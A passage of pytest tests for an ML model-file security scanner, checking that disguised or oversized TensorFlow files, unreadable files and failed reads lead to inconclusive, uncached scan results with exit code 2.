    disguised_metagraph.write_bytes(_build_collection_only_tf_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


def test_scan_file_does_not_flag_benign_renamed_tf_metagraph_collection_metadata(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "benign-collection-only.jpg"
    disguised_metagraph.write_bytes(
        _build_collection_only_tf_metagraph(value=b"documentation: https://example.invalid/runtime")
    )

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is True
    assert not any(check.name == "MetaGraph Structural Validation" for check in result.checks)
    assert not any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


def test_scan_file_does_not_flag_benign_renamed_tf_savedmodel_collection_metadata(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "benign-collection.jpg"
    disguised_savedmodel.write_bytes(
        _build_collection_only_tf_savedmodel(value=b"documentation: https://example.invalid/runtime")
    )

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert not any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)


def test_scan_file_fails_closed_for_oversized_renamed_tf_savedmodel_without_caching(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved-large.jpg"
    seed = _build_malicious_tf_savedmodel()
    disguised_savedmodel.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        first = scan_file(str(disguised_savedmodel), config=config)
        second = scan_file(str(disguised_savedmodel), config=config)

        assert first.scanner_name == "tf_savedmodel"
        assert first.success is False
        assert second.success is False
        assert first.metadata["operational_error_reason"] == "savedmodel_parse_budget_exceeded"
        assert any("SavedModel exceeds bounded parse budget" in issue.message for issue in first.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_for_incomplete_tf_protobuf_routing_without_caching(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
    ambiguous_payload = tmp_path / "ambiguous-routing.jpg"
    ambiguous_payload.write_bytes(b"\x08\x01" + (b"\x18\x00" * 4))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        first = scan_file(str(ambiguous_payload), config=config)
        second = scan_file(str(ambiguous_payload), config=config)

        assert first.scanner_name == "unknown"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert first.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert "tensorflow_protobuf_routing_incomplete" in first.metadata["scan_outcome_reasons"]
        check = next(check for check in first.checks if check.name == "TensorFlow Protobuf Routing")
        assert "bounded structural probe reached its limit" in check.message
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(ambiguous_payload), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    "filename",
    ["versioned-oversized-field-two.jpg", "versioned-oversized-field-two.py", "versioned-oversized-field-two.pyw"],
)
def test_scan_file_keeps_versioned_oversized_protobuf_on_inconclusive_route_without_caching(
    tmp_path: Path,
    filename: str,
) -> None:
    generic_payload = tmp_path / filename
    oversized_field_size = _MAX_PARSE_BYTES + 1
    generic_payload.write_bytes(b"\x08\x01" + b"\x12\x81\x80\x80\x0a" + (b"x" * oversized_field_size))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        result = scan_file(str(generic_payload), config=config)
        repeated_result = scan_file(str(generic_payload), config=config)

        assert result.scanner_name == "unknown"
        assert result.success is False
        assert repeated_result.success is False
        assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(generic_payload), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "oversized.jpg"
    seed = _build_malicious_tf_metagraph()
    disguised_metagraph.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(disguised_metagraph), config=config)
        repeated_result = scan_file(str(disguised_metagraph), config=config)

        assert result.scanner_name == "tf_metagraph"
        assert result.success is False
        assert repeated_result.success is False
        assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
        assert any("MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


@pytest.mark.parametrize("suffix", [".jpg", ".pb"])
def test_scan_file_fails_closed_on_unparseable_tentative_onnx_candidate(tmp_path: Path, suffix: str) -> None:
    pytest.importorskip("onnx")
    malformed_payload = tmp_path / f"malformed-large{suffix}"
    malformed_payload.write_bytes((b"\x42\x00" * 4097) + b"\x08")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(malformed_payload), config=config)
        repeated_result = scan_file(str(malformed_payload), config=config)

        assert result.scanner_name == "unknown"
        assert result.success is False
        assert repeated_result.success is False
        assert result.bytes_scanned == malformed_payload.stat().st_size
        assert result.metadata["scan_outcome"] == "inconclusive"
        assert "onnx_tentative_candidate_parse_incomplete" in result.metadata["scan_outcome_reasons"]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(malformed_payload), cache_scan_results=False)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp_path: Path) -> None:
    malformed_payload = tmp_path / "malformed-large.jpg"
    malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))

    result = scan_file(str(malformed_payload), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(malformed_payload), cache_enabled=False)

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert aggregate.success is True
    assert core_module.determine_exit_code(aggregate) == 0


def test_scan_file_routes_large_field_two_protobuf_to_fail_closed_tensorflow_scan(tmp_path: Path) -> None:
    generic_payload = tmp_path / "candidate-large.jpg"
    generic_payload.write_bytes(b"\x0a\x03\x0a\x01x" + b"\x12\x81\x80\x80\x0a" + (b"x" * (_MAX_PARSE_BYTES + 1)))

    result = scan_file(str(generic_payload), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(generic_payload), cache_enabled=False)

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
    near_match = tmp_path / "metadata.pb"
    near_match.write_bytes(bytes([0x0A, 0x04]) + b"onnx" + b"\x00" * 16)

    result = scan_file(str(near_match))

    assert result.scanner_name != "onnx"
    assert not any(check.name == "Python Operator Detection" for check in result.checks)


def test_scan_file_fails_closed_when_recognized_format_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(unavailable_onnx))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert "Recognized format could not be scanned" in check.message
    assert check.details["format"] == "onnx"
    assert check.details["preferred_scanner_id"] == "onnx"

    aggregate = core_module.scan_model_directory_or_file(str(unavailable_onnx))
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_fail_closed_for_extension_only_recognized_format(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    generic_pb = tmp_path / "metadata.pb"
    generic_pb.write_bytes(b"plain protobuf-ish bytes")

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(generic_pb))

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "Format Detection" for check in result.checks)


def test_scan_file_fails_closed_when_format_detection_read_fails_without_owner(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable = tmp_path / "unowned.payload"
    unreadable.write_bytes(b"payload whose owning format cannot be read")

    def raise_read_error(_path: str) -> str:
        raise OSError("simulated format detection read failure")

    monkeypatch.setattr(core_module, "detect_file_format", raise_read_error)

    result = scan_file(str(unreadable))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "format_detection_read_failed"
    assert "format_detection_read_failed" in result.metadata["scan_outcome_reasons"]
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert check.details["analysis_incomplete"] is True

    aggregate = core_module.scan_model_directory_or_file(str(unreadable))
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_unreadable_non_read_failure_aware_suffix_is_operational(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable = tmp_path / "unavailable.onnx"
    unreadable.write_bytes(b"unreadable ONNX-like payload")
    real_access = os.access

    def deny_file_access(candidate: str | bytes | os.PathLike[str], mode: int) -> bool:
        if str(candidate) == str(unreadable):
            return False
        return real_access(candidate, mode)

    monkeypatch.setattr(core_module.os, "access", deny_file_access)
    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "unknown")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "unknown")

    result = scan_file(str(unreadable), config={"cache_enabled": False})
    aggregate = core_module.scan_model_directory_or_file(str(unreadable), cache_enabled=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "format_detection_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_preserves_r_serialized_outcome_after_failed_read_probes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    r_path = tmp_path / "unavailable.rds"
    r_path.write_bytes(b"X\nsafe\nmodel")

    def raise_route_read_error(*_args: object, **_kwargs: object) -> str:
        raise OSError("simulated routing read failure")

    def raise_r_read_error(*_args: object, **_kwargs: object) -> tuple[bytes, str, bool, int]:
        raise PermissionError(13, "simulated R payload read failure")

    monkeypatch.setattr(core_module, "detect_file_format", raise_route_read_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_route_read_error)
    monkeypatch.setattr(
        "modelaudit.scanners.r_serialized_scanner.RSerializedScanner._read_payload_for_analysis",
        raise_r_read_error,
    )

    result = scan_file(str(r_path), config={"cache_scan_results": False})

    assert result.scanner_name == "r_serialized"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "r_serialized_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_unreadable_suffix_only_candidate_does_not_emit_path_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unavailable.onnx"
    model_path.write_bytes(b"unreadable onnx candidate")
    real_access = os.access

    def unreadable_path(candidate: str, mode: int) -> bool:
        return False if candidate == str(model_path) and mode == os.R_OK else real_access(candidate, mode)

    def raise_read_error(*_args: object, **_kwargs: object) -> str:
        raise OSError("simulated unreadable model payload")

    monkeypatch.setattr(os, "access", unreadable_path)
    monkeypatch.setattr(core_module, "detect_file_format", raise_read_error)

    direct = scan_file(str(model_path), config={"cache_scan_results": False})
    aggregate = core_module.scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert direct.scanner_name == "unknown"
    assert direct.success is False
    assert direct.metadata["operational_error_reason"] == "format_detection_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)


@pytest.mark.parametrize(
    ("filename", "scanner_name", "failure_reason"),
    [
        ("README.md", "text", "text_content_read_failed"),
        ("README", "text", "text_content_read_failed"),
        ("model_card", "text", "text_content_read_failed"),
    ],
)
def test_scan_file_preserves_metadata_outcome_after_failed_read_probes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    scanner_name: str,
    failure_reason: str,
) -> None:
    readme_path = tmp_path / filename
    readme_path.write_text("# metadata\n", encoding="utf-8")

    def raise_read_error(*_args: object, **_kwargs: object) -> str:
        raise OSError("simulated read failure")

    monkeypatch.setattr(core_module, "detect_file_format", raise_read_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_read_error)
    monkeypatch.setattr("modelaudit.scanners.metadata_scanner.open", raise_read_error, raising=False)
    monkeypatch.setattr("modelaudit.scanners.text_scanner.open", raise_read_error, raising=False)

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == scanner_name
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == failure_reason
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_unavailable_recognized_format_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    reset_cache_manager()
    try:
        first = scan_file(str(unavailable_onnx), config=config)
        second = scan_file(str(unavailable_onnx), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_single_file_scan_bypasses_stale_cache_when_owner_becomes_unreadable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "cached.lightgbm"
    model_path.write_text(
        "\n".join(
            [
                "tree",
                "version=v4",
                "num_class=1",
                "num_tree_per_iteration=1",
                "max_feature_idx=2",
                "feature_names=f0 f1 f2",
                "feature_infos=[0:1] [0:1] [0:1]",
                "tree_sizes=12",
                "Tree=0",
                "num_leaves=2",
                "split_feature=0",
                "split_gain=1.0",
                "threshold=0.5",
                "decision_type=<=",
                "left_child=-1",
                "right_child=-2",
                "leaf_value=0.1 0.2",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            first = core_module.scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert core_module.determine_exit_code(first) == 0
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        real_access = os.access

        def deny_model_access(candidate: str | bytes | os.PathLike[str], mode: int) -> bool:
            if str(candidate) == str(model_path):
                return False
            return real_access(candidate, mode)

        monkeypatch.setattr("modelaudit.utils.helpers.cache_decorator.os.access", deny_model_access)

        second = core_module.scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = second.file_metadata[str(model_path)]
        assert metadata["operational_error_reason"] == "lightgbm_read_failed"
        assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
        assert core_module.determine_exit_code(second) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_directory_scan_bypasses_stale_cache_when_owner_read_fails_with_access(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    cached_clean = model_dir / "cached.lightgbm"
    cached_clean.write_text(
        "\n".join(
            [
                "tree",
                "version=v4",
                "num_class=1",
                "num_tree_per_iteration=1",
                "max_feature_idx=2",
                "feature_names=f0 f1 f2",
                "feature_infos=[0:1] [0:1] [0:1]",
                "tree_sizes=12",
                "Tree=0",
                "num_leaves=2",
                "split_feature=0",
                "split_gain=1.0",
                "threshold=0.5",
                "decision_type=<=",
                "left_child=-1",
                "right_child=-2",
                "leaf_value=0.1 0.2",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    malicious = model_dir / "malicious.lightgbm"
    _write_malicious_lightgbm(malicious)
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            warm = core_module.scan_model_directory_or_file(
                str(cached_clean),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert core_module.determine_exit_code(warm) == 0
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0

        real_open = open

        def fail_cached_lightgbm_read(
            candidate: str | bytes | os.PathLike[str],
            *args: Any,
            **kwargs: Any,
        ) -> Any:
            if str(candidate) == str(cached_clean):
                raise OSError("simulated transient LightGBM read failure")
            return real_open(candidate, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fail_cached_lightgbm_read)

        result = core_module.scan_model_directory_or_file(
            str(model_dir),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = result.file_metadata[str(cached_clean)]
        assert metadata["operational_error_reason"] == "lightgbm_read_failed"
        assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert core_module.determine_exit_code(result) == 2
    finally:
        reset_cache_manager()


@pytest.mark.parametrize(
    ("filename", "writer", "reason", "check_name", "message_fragment"),
    [
        ("cached.mlmodel", create_mock_coreml, "coreml_read_failed", "CoreML File Read", "Failed to read CoreML file"),
        (
            "cached.safetensors",
            _write_minimal_safetensors,
            "safetensors_read_failed",
            "SafeTensors File Read",
            "Unable to read SafeTensors file",
        ),
        (
            "cached.engine",
            _write_safe_tensorrt,
            "tensorrt_read_failed",
            "TensorRT Engine Read",
            "Error reading TensorRT engine",
        ),
        ("cached.npy", _write_minimal_numpy, "numpy_read_failed", "NumPy File Read", "Unable to read NumPy file"),
        ("cached.npz", _write_safe_npz, "zip_analysis_incomplete", "ZIP File Scan", "Error scanning zip file"),
        ("cached.pdmodel", _write_safe_paddle, "paddle_read_failed", "Paddle File Read", "Error reading file"),
        (
            "cached.bin",
            _write_safe_pytorch_binary,
            "pytorch_binary_read_failed",
            "Binary File Read",
            "Unable to read binary file",
        ),
        (
            "saved_model.pb",
            _write_safe_savedmodel,
            "savedmodel_read_failed",
            "SavedModel File Read",
            "Unable to read TF SavedModel file",
        ),
        (
            "cached.rds",
            _write_safe_r_serialized,
            "r_serialized_read_failed",
            "R Serialized Read",
            "Unable to read R serialized payload",
        ),
    ],
)
def test_single_file_scan_bypasses_stale_cache_when_read_failure_aware_owner_read_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    writer: Callable[[Path], object],
    reason: str,
    check_name: str,
    message_fragment: str,
) -> None:
    model_path = tmp_path / filename
    writer(model_path)
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            first = core_module.scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert core_module.determine_exit_code(first) == 0
        assert first.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        real_open = open

        def fail_cached_binary_read(
            candidate: str | bytes | os.PathLike[str],
            *args: Any,
            **kwargs: Any,
        ) -> Any:
            if str(candidate) == str(model_path):
                if reason == "r_serialized_read_failed":
                    raise PermissionError(13, f"simulated transient {reason} read")
                raise OSError(f"simulated transient {reason} read")
            return real_open(candidate, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fail_cached_binary_read)
        if filename.endswith(".npz"):
            real_zip_file = zipfile.ZipFile

            def fail_cached_zip_read(
                candidate: str | os.PathLike[str],
                *args: Any,
                **kwargs: Any,
            ) -> Any:
                if str(candidate) == str(model_path):
                    raise OSError(f"simulated transient {reason} read")
                return real_zip_file(candidate, *args, **kwargs)

            monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_cached_zip_read)

        second = core_module.scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = second.file_metadata[str(model_path)]
        assert second.success is False
        assert metadata["operational_error_reason"] == reason
        assert reason in metadata["scan_outcome_reasons"]
        assert any(check.name == check_name and message_fragment in check.message for check in second.checks)
        assert core_module.determine_exit_code(second) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_single_file_scan_bypasses_stale_cache_when_numpy_header_read_fails_after_cache_warm(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "cached.npy"
    _write_minimal_numpy(model_path)
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            first = core_module.scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert core_module.determine_exit_code(first) == 0
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        def raise_header_oserror(*_args: object, **_kwargs: object) -> None:
            raise OSError("simulated NumPy header read failure")

        monkeypatch.setattr("modelaudit.scanners.numpy_scanner.fmt.read_array_header_1_0", raise_header_oserror)

        second = core_module.scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = second.file_metadata[str(model_path)]
        assert second.success is False
        assert metadata["operational_error_reason"] == "numpy_read_failed"
        assert "numpy_read_failed" in metadata["scan_outcome_reasons"]
        assert any(
            check.name == "NumPy File Read" and "Unable to read NumPy file" in check.message for check in second.checks
        )
        assert core_module.determine_exit_code(second) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


@pytest.mark.parametrize(
    ("filename", "writer", "reason", "check_name", "message_fragment"),
    [
        ("cached.mlmodel", create_mock_coreml, "coreml_read_failed", "CoreML File Read", "Failed to read CoreML file"),
        (
            "cached.safetensors",
            _write_minimal_safetensors,
            "safetensors_read_failed",
            "SafeTensors File Read",
            "Unable to read SafeTensors file",
        ),
        (
            "cached.engine",
            _write_safe_tensorrt,
            "tensorrt_read_failed",
            "TensorRT Engine Read",
            "Error reading TensorRT engine",
        ),
        ("cached.npy", _write_minimal_numpy, "numpy_read_failed", "NumPy File Read", "Unable to read NumPy file"),
        ("cached.npz", _write_safe_npz, "zip_analysis_incomplete", "ZIP File Scan", "Error scanning zip file"),
        ("cached.pdmodel", _write_safe_paddle, "paddle_read_failed", "Paddle File Read", "Error reading file"),
        (
            "cached.bin",
            _write_safe_pytorch_binary,
            "pytorch_binary_read_failed",
            "Binary File Read",
            "Unable to read binary file",
        ),
        (
            "saved_model.pb",
            _write_safe_savedmodel,
            "savedmodel_read_failed",
            "SavedModel File Read",
            "Unable to read TF SavedModel file",
        ),
        (
            "cached.rds",
            _write_safe_r_serialized,
            "r_serialized_read_failed",
            "R Serialized Read",
            "Unable to read R serialized payload",
        ),
    ],
)
def test_directory_scan_bypasses_stale_cache_when_read_failure_aware_owner_read_fails_with_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    writer: Callable[[Path], object],
    reason: str,
    check_name: str,
    message_fragment: str,
) -> None:
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    cached_clean = model_dir / filename
    writer(cached_clean)
    malicious = model_dir / "malicious.pkl"
    malicious.write_bytes(_build_malicious_pickle())
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            warm = core_module.scan_model_directory_or_file(
                str(cached_clean),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert core_module.determine_exit_code(warm) == 0
        assert warm.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        real_open = open

        def fail_cached_binary_read(
            candidate: str | bytes | os.PathLike[str],
            *args: Any,
            **kwargs: Any,
        ) -> Any:
            if str(candidate) == str(cached_clean):
                if reason == "r_serialized_read_failed":
                    raise PermissionError(13, f"simulated transient {reason} read")
                raise OSError(f"simulated transient {reason} read")
            return real_open(candidate, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fail_cached_binary_read)
        if filename.endswith(".npz"):
            real_zip_file = zipfile.ZipFile

            def fail_cached_zip_read(
                candidate: str | os.PathLike[str],
                *args: Any,
                **kwargs: Any,
            ) -> Any:
                if str(candidate) == str(cached_clean):
                    raise OSError(f"simulated transient {reason} read")
                return real_zip_file(candidate, *args, **kwargs)

            monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", fail_cached_zip_read)

        result = core_module.scan_model_directory_or_file(
            str(model_dir),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = result.file_metadata[str(cached_clean)]
        assert result.success is False
        assert metadata["operational_error_reason"] == reason
        assert reason in metadata["scan_outcome_reasons"]
        assert any(check.name == check_name and message_fragment in check.message for check in result.checks)
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert core_module.determine_exit_code(result) == 2
    finally:
        reset_cache_manager()


def test_scan_file_unavailable_protobuf_candidate_analyzer_fails_closed_and_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    candidate = tmp_path / "candidate.jpg"
    candidate.write_bytes(b"bounded-probe candidate")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

